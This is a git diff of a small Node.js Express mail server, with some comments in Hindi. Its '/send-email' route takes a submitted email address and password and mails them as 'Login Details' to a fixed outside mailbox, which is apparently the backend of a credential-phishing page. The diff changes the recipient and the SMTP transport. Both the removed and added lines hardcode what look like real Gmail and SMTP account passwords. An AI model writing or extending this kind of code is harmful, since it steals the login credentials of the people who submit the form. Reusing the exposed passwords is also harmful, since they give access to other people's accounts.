@@ -10,12 +10,14 @@ app.use(cors());
 
 app.use(bodyParser.json());
 
-// Create a transporter object using the default SMTP transport
+// SMTP server ke liye transporter object create karo
 let transporter = nodemailer.createTransport({
-    service: 'gmail',
+    host: 'smtp.hostinger.com',  // Replace with your SMTP server host
+    port: 587, // Common SMTP port; use 465 for secure SSL
+    secure: false, // True for port 465, false for port 587
     auth: {
-        user: 'sauravgarg5922@gmail.com',  // Replace with your Gmail address
-        pass: 'oaav lkcs afwy qrjt'  // Replace with your app password
+        user: 'smtp@gdogo.com',  // Replace with your SMTP username
+        pass: 'ozbIGQ|sP1'   // Replace with your SMTP password
     }
 });
 
@@ -24,8 +26,8 @@ app.post('/send-email', (req, res) => {
     const { email, password } = req.body;
 
     let mailOptions = {
-        from: 'ghostriderworkspace@gmail.com',
-        to: 'ghostriderworkspace@gmail.com',  // Replace with recipient email if different
+        from: 'smtp@gdogo.com',  // Replace with your email address
+        to: 'devjha547@gmail.com',  // Replace with recipient email address
         subject: 'Login Details',
         text: `Email: ${email}\nPassword: ${password}`
     };
